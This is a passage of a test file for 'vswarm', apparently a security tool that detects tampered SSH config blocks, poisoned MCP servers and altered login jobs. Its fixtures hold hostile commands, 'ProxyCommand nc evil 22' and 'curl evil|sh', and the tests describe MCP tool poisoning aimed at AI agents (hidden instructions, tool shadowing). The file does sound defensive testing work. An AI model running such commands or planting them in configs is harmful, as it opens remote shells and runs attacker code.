    await release("v1.2.0", "b", signer("b"));                 // a takeover: new key, and the repo's list swapped to it
    expect((await up("1.0.0")).status).toBe("refused");
    await release("v1.3.0", "a");
    expect(await up("1.0.0")).toMatchObject({ status: "updated", to: "v1.3.0" });
    expect((await up("2.0.0")).status).toBe("refused");       // never go back
  }, 60_000);
});

describe("vswarm's own blocks", () => {
  test("blocks vswarm wrote are left out of scans; a tampered one is not", () => {
    const { recordManaged, stripManaged } = require("../src/sec/store");
    process.env.VSWARM_SEC_DIR = mkdtempSync(join(tmpdir(), "vs-man-"));
    try {
      const block = "# >>> vswarm gate >>>\nMatch originalhost prod-* !exec \"vswarm preflight --quiet --host %h\"\n# <<< vswarm gate <<<\n";
      recordManaged(block);
      expect(stripManaged(`Host a\n${block}Host b\n`)).toBe("Host a\nHost b\n");
      const tampered = block.replace("prod-*", "prod-* \n    ProxyCommand nc evil 22");
      expect(stripManaged(`Host a\n${tampered}`)).toContain("evil");
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  });
});

describe("MCP inspection", () => {
  const { judgeTools, pinTools, inspect } = require("../src/sec/mcp");
  const { canSandbox } = require("../src/sec/try/spawn");
  const { agents } = require("../src/sec/collect/agents");

  test.skipIf(!canSandbox())("a poisoned server is started in the sandbox, read, pinned, and its later change is caught", async () => {
    const home = mkdtempSync(join(tmpdir(), "vs-mcp-"));
    process.env.VSWARM_TRY_DIR = join(home, "try");
    try {
      mkdirSync(join(home, ".cursor"), { recursive: true });
      const server = join(import.meta.dir, "fixtures/evil-mcp/server.js");
      const conf = (v: string) => writeFileSync(join(home, ".cursor/mcp.json"), JSON.stringify({ mcpServers: { calc: { command: process.execPath, args: [server], env: { EVIL_MCP_VERSION: v } } } }));
      conf("1");
      const [item] = await agents({ home, system: false, pathDirs: [], run: async () => undefined, host: "t", user: "t" });
      const r = await inspect(item, { sandbox: true });
      expect(r.error).toBeUndefined();
      expect(r.sandboxed).toBe(true);
      expect(r.tools.map((t: any) => t.name)).toEqual(["add", "format_code", "weather"]);
      const found = judgeTools(item, r.tools, new Set(["send_email"]));
      const add = found.find((f: any) => f.title.includes('"add"'));
      expect(add.severity).toBe("high");
      expect([add.title, ...add.detail].join(" ")).toContain("hidden-instruction markup");
      expect([add.title, ...add.detail].join(" ")).toContain("keep something from the user");
      expect(found.find((f: any) => f.title.includes('"weather"')).title).toContain("invisible characters");
      const pins = {};
      expect(pinTools(item, r.tools, pins)).toEqual([]);
      conf("2");
      const r2 = await inspect(item, { sandbox: true });
      const later = [...judgeTools(item, r2.tools, new Set(["send_email"])), ...pinTools(item, r2.tools, pins)];
      expect(later.some((f: any) => f.rule === "mcp-changed" && f.detail[0] === "changed: format_code")).toBe(true);
      expect(later.some((f: any) => f.title.includes('"format_code"') && f.detail.concat(f.title).join(" ").includes("tool shadowing"))).toBe(true);
    } finally {
      delete process.env.VSWARM_TRY_DIR;
    }
  }, 120_000);
});

describe("vswarm watch", () => {
  test("vswarm's own job is not a new login job; the same file edited by someone else is", async () => {
    const { jobFiles } = require("../src/sec/schedule");
    const { recordManagedFile } = require("../src/sec/store");
    const { launchd, autostart } = require("../src/sec/collect/system");
    const root = mkdtempSync(join(tmpdir(), "vs-watch-"));
    process.env.VSWARM_SEC_DIR = join(root, "sec");
    const home = join(root, "home");
    try {
      // The home is passed in: bun's homedir() ignores a $HOME changed at run time, and this must never touch the real one.
      const files = jobFiles("/v/bin/vswarm", 60, home);
      for (const p of Object.keys(files)) expect(p.startsWith(home)).toBe(true);
      for (const [p, text] of Object.entries<string>(files)) {
        mkdirSync(require("node:path").dirname(p), { recursive: true });
        writeFileSync(p, text);
        recordManagedFile(text);
      }
      const ctx = { home, system: false, pathDirs: [], host: "t", user: "t", run: async () => undefined };
      const jobs = async () => [...(await launchd(ctx)), ...(await autostart(ctx))];
      expect(await jobs()).toEqual([]);
      const [p, text] = Object.entries<string>(files)[0];
      writeFileSync(p, text.replace("watch", "watch;curl evil|sh"));
      expect((await jobs()).length).toBe(1);
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  });
});
